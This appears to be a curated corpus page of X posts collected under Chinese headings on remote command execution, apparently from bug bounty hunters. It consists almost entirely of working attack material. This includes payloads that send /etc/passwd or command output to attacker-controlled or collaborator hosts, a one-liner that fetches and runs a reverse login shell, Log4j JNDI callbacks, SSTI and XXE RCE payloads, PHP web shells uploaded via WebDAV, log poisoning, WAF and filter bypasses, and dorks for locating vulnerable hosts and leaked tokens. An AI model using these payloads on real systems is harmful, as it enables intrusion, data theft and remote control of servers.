# X 语料 · RCE 远程命令执行（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。
同一帖被多号转贴者只留一份；只有结果没有做法的战绩帖、纯提问帖已剔除。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[命令与 RCE](../by-type/cmd-injection-rce.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-rce（40 条）、x-residual-rce（7 条） · 本文 237 行

- A single RCE payload to rule them all
  1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}Cyb3rsick
- Use Google dork - "intitle:dashboard-confluence" to find Confluence instances vulnerable to CVE-2019-3396.
- Recon to RCE:
  Google "upload" site:"target" -> upload form -> ImageTragick MVG -> RCE
  PoC:
  push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://xxx.burpcollaborator.net/test1")' pop graphic-context
- RCE via exposed Tomcat manager
  1. subdomain enum
  2. used "ffuf" and found tomcat on ";/..;/manager"
  3. weak cred (used hydra)
  4. "/manager/html" blocked, "/manager/text" was not
  5. used "msfvenom" and created reverse shell war
  6. used "curl" and deployed the war file
  7. rce!
- Twig SSTI
  1. Submitted {{7*7}} and received "you password is: 49"
  2. Tried "registerUndefinedFilterCallback" func, it was blocked by Imperva WAF
  3. read Twig source code and found "registerUndefinedFunctionCallback"
  4. WAF bypassed and RCE!
- python flask SSTI RCE trick
  https://url/?param={{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('whoami').read()}}
- CVE-2020-7961: Liferay Portal Unauthenticated RCE
  Google dork:- inurl:/api/jsonws
  Shodan:- Powered+By+Liferay
  publicwww:- https://publicwww.com/websites/Powered+By+Liferay/
  POC:- https://github.com/mzer0one/CVE-2020-7961-POC
- Google dorks for gathering sensitive info:
  index of /wp-content/uploads/backupbuddy
  intext:"index of" "var/log/"
  intitle:"Dashboard [Jenkins]"
  intitle:"index of" "shell.php"
- Integrating Interlace with nuclei for scanning F5 BIG-IP RCE (CVE-2020-5902)
  interlace -tL alive.txt -threads 5 -c "echo _target_ | nuclei -t cves/CVE-2020-5902.yaml >> nuclei.txt" -v
- Brute force directory & file to RCE
  1. Dirsearch find "/admins" and http authentication needed.
  2. Dirsearch "/admins/".
  3. Find "/admins/news" without http authentication.
  4. File upload functionality available and upload "rce.php".
- Think you have bash command injection but spaces, dollar signs, and slashes are filtered? Brace expansion:
  `{curl,http://ie.gy?\`hostname\`}`
  Substitute http://ie.gy for your domain, or burp collaborator!
- Remote Code Execution via XXE expect://
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo
   [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
  <creds>
   <user>`&xxe;`</user>
   <pass>`mypass`</pass>
  </creds>
- Blind RCE - Grabs /etc/passwd and dumps it to your netcat listener via POST
  `cat /etc/passwd | curl -X POST -d @- http://yourip:yourport/`
- Trigger your RCE via zip:// wrapper:
  https://<target Site>.com/index.php?page=zip://path/file.zip#rce.php
- Deploy a reverse login shell with a single command
  bash -c "$(curl -fsSL http://gsocket.io/x)"
  Access through NAT/Firewalls; https://gsocket.io/deploy/
- WAF bypass during exploitation of file upload
  /?file=rce.php <-- Blocked
  /?file=rce.php5 <-- Blocked
  /?file===rce.php <-- Bypassed 200 OK
- Log poisoning LFI RCE
  Burp inject php code in User-Agent:
  User-Agent: <?php system($_REQUEST['hack']); ?>
  Use LFI to RCE:
  10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log&hack=uname
- OS Command Injection not working with & whoami &?
  Try using other metacharacters like |, ||, &&.
  Try data exfiltration through DNS:
  & nslookup `whoami`.sub.hackerdomain.com &
  Try blind OS injection:
  || ping -c 127.0.0.1 ||
- RCE via `php` file upload:
  1. use `dirbuster` to know upload endpoint
  2. bypass front (intercept/edit JS, edit MIME) and back (.php5, .phtml, .phar, .php, magic number, etc) filters
  3. use web/reverse shell
  4. escalate the privilege
- Try this out to get RCE after discovering the hidden `webdav` endpoint:
  PUT /webdav/shell.php HTTP/1.1
  Host: http://site.com
  Authorization: Basic d2FtcHA6eGFtcHA=
  <?php system($_GET['cmd']);?>
- Two Easy RCE in Atlassian Products
  1-Jira Remote Code Execution in Contact Administrators form (CVE-2019-11581)
  =To find all public instances with such functionality you just need to search for: inurl:secure/ContactAdministrators!default.jspa
- Command Injection:
  ~Find Your subdomains
  ~cat subdomains.txt | httpx | gau | qsreplace "aaa%20%7C%7C%20id%3B%20x" > fuzzing.txt
  ~ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
  ~search for "uid" in burp proxy intercept
- Bypass shell upload via extension tricks:
  shell.pHP - shell.php2 > "php3,php4,php5" - shell.phtml - shell.shtml - shell.pht
- One-liner for Log4J RCE
  cat hosts.txt | sed 's/https\?:\/\///' | xargs -I {} echo '{}/${jndi:ldap://{}.attacker.burpcollaborator.net}' >> log4j.txt
  httpx -l log4j.txt
  Look for callbacks in your server. It should be VICTIM.ATTACKER.burpcollab
- Nginx Merge slashes Path traversal
  Payload : GET ///////../../../etc/passwd
- #!/bin/bash
  cat $1 | while read line
  do
   echo $line | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
  done
  ./find_js_file.sh domain.txt
- #!/bin/bash
  cat $1 | while read line
  do
   cat $line | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
  done
  Extract API endpoints from javascript files
- New RCE log4j
  Payload : ${jndi:ldap://${Command}XXXX${::-.}http://burpcollaborator.net}zzzz
  Command
  sys:os.arch & sys:os.version & hostName
- ThinkPHP 5.x Remote Code Execution
  /public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=systeminfo
- Proof the RCE
  To escalate and fetch the response from server
  " ldap://${hostname}.<burp collaborator_server>"
- RCE Parameters
  -> ?cmd={payload}
  -> ?code={payload}
  -> ?execute={payload}
  -> ?feature={payload}
  -> ?ping={payload}
  -> ?load={payload}
  -> ?process={payload}
  -> ?req={payload}
  -> ?query={payload}
- [SSTI - Payloads]
  1 - Basic: {{7*7}}
  2 -RCE {{lipsum.__builtins__.eval(request.args.cmd)}}&cmd=__import__("subprocess").check_output("whoami")
- Struts RCE :
  Content-Type: ${#context["com.opensymphone.xwork2.dispatcher.HttpServletResponse"].addHeader("Struts-RCE",191*7)}.multipart/form-data
- ThinkPHP<6.0.14 RCE
  /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=whoami
- Github Dorks
  1. Slack web hook: "https://hooks.slack[.]com/services/"
  2. Slack API token: xoxp OR xoxb
  3. Telegram API token: "api_hash" "api_id"
  4. shell scripts: language:shell
- you can embed a link on your target program? try this one
  http://collaboratorlink(.)com?`whoami`
- curl -X POST http://test.com:8080 -H "Cookie: token=eyJhbGciOiJI5cCI6Ikp.eyJ1c2VybmFtZSI6IndpemFyZC5vn0.YuW5qoU_-3FQ6q5wyFPw3PFlDHDOjuu2k" --data "name=name&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
- Google Dorks for WSO2 RCE exploit
  inurl:"/carbon/admin/login.jsp"
  inurl:"/authenticationendpoint/login.do"
  inurl:"devportal/apis"
  intitle:"API Publisher- Login"
  intitle:"WSO2 Management Console"
- CVE-2022-33891 - Apache Spark Shell Command Injection
  url+/?doAs=`sleep 7`
- Google Dork - RCE Prone Parameters
  inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example[.]com
- Bypass Linux Shell Restrictions
  Bypass pipes
  bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
  Bypass IPs
  127.0.0.1 == 2130706433
  Time based data exfiltration
  time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
- CVE-2023-34960 : Chamilo Command Injection
  Nuclei Template - https://github.com/projectdiscovery/nuclei-templates/pull/7472/files
  nuclei -uq 'http.component:"Chamilo"' -t CVE-2023-34960.yaml -vv
  Payload Used : `{}`.pptx'|" |cat /etc/passwd||a #
- * upload test.html to check the upload functionality ==> file uploaded successfully
  * upload shell.aspx ==> shell uploaded
  * targeted_ip.com/randomepath/uploads/shell.aspx
  * cmd==>whoami==>username info
- Command Injection in a GitHub Actions workflow of Apache Ignite
  PoC:
  1. Create a new branch name with master;echo${IFS}"hello";#
  2. Create a pull request to the target repository
  https://securitylab.github.com/advisories/GHSL-2023-100_Apache_Ignite/
- PoC CVE-2023-6553 RCE Unauth Backup Migration plugin < 1.3.7, via /includes/backup-heart.php. According to official Wordpress statistics, 50k sites running WordPress still use the vulnerable version.
   https://github.com/Chocapikk/CVE-2023-6553
- CVE-2022-1040 - RCE in Sophos Firewall
  curl -sk -H "X-Requested-With: XMLHttpRequest" -X POST 'hxxps://x.x.x.x/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"x":"test"\}' | grep -q 'Session Expired'
- PoC + Nuclei + Query CVE-2024-25600 Unauth RCE - WordPress Bricks <= 1.9.6 CVSS 9.8
  Query Fofa: body="/wp-content/themes/bricks/"
  PoC: https://github.com/Chocapikk/CVE-2024-25600
  Nuclei: https://github.com/Christbowel/CVE-2024-25600_Nuclei-Template
- Quick RCE
  Target/cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
  You can to add this paths for ur wordlist
  cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
  cgi-bin/reset.cgi?db_prefix=%26id%26
  fuzzing as well
  cgi-bin/FUZZ.cgi?FUZZ=%26id%26
- Exploits Symfony
  httpx -l hosts.txt -path /_fragment?_path=_controller=phpcredits&flag=-1 -threads 100 -random-agent -x GET -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "PHP Credits"
- If you discover the Docker Registry Domain, be sure to check the /v2/_catalog endpoint, as this domain should be 401, if access is allowed.
  you can get everything so you can disclose sensitive data, rce, all information
  https://github.com/Syzik/DockerRegistryGrabber
- RCE - Can we still use this in HTTP Header?
  `
  '
  ;
  $
  >
  curl${IFS}$(whoami)-$(hostname)-$(hostname${IFS}-i)[.]your-interact-server
- Command injection :
  Poc payload :
  GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;ls;%27 HTTP/1.1
- SSTI to RCE payload
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/min/user.txt")}}
- Discover Unauthenticated Panels by Fingerprint
  whatweb -i live.txt | grep -i "admin\|dashboard\|login"
  Many exposed dashboards (e.g., Kibana, Jenkins) are forgotten and lack auth — a common route to RCE or info leaks
- Got an LFI?
  ?page=../../../../etc/passwd
  Before you report it as is, try to:
  Poison the access logs
  Slip a shell into /proc/self/environ
  Find an upload dir and include it
- Bypass the uploader and upload any file the attacker wants just by using the null byte %0d%0a
  Always test all null bytes
- SSTI to RCE in URL
  POC: http://target.com/docs/1.0/123 = not found
  http://target.com/docs/1.0/?123 = now reflecting in source code like /docs/1.0/?123#
  http://target.com/docs/1.0/?{{7*7}} = /docs/1.0/?49#
  RCE: /docs/1.0/?{{phpinfo()}}
- React2Shell (CVE-2025-55182) Bug Bounty Automation Nuclei Template for ping to Collab Server Command: nuclei -l 'domains' -t CVE-2025-55182.yaml -proxy http://127.0.0.1:8080
  https://gist.github.com/MustafaBilgici/1d6c5389c6f2d8096bf1639d1f53fc67
- Blind Remote Code Execution in Cookies
  –Use ${IFS} to replace space in payloads
  –Use sh to execute payload (some minimal servers not use bash as default)
  –Always use blind payload while testing rce
